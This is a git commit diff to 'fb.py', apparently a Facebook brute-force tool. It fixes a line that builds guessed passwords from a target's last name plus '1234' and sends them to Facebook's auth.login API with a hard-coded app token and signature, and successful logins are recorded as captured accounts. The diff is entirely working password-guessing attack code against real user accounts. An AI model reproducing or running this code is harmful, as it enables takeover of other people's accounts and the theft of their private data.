971672741f60a56c3c925d61e07fed52387d9d03
gendeng777 <69396037+gendeng777@users.noreply.github.com>
2020-10-10 00:31:35 +0700

    Update fb.py

--- fb.py
+++ fb.py
@@ -895,7 +895,7 @@ def pilih_mbf():
 																															cek.close()
 																															cp.append(user+pass14)
 																														else:
-																															pass15 = b['last_name'] '1234'
+																															pass15 = b['last_name'] + '1234'
 																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																															q = json.load(data)
 																															if 'access_token' in q:
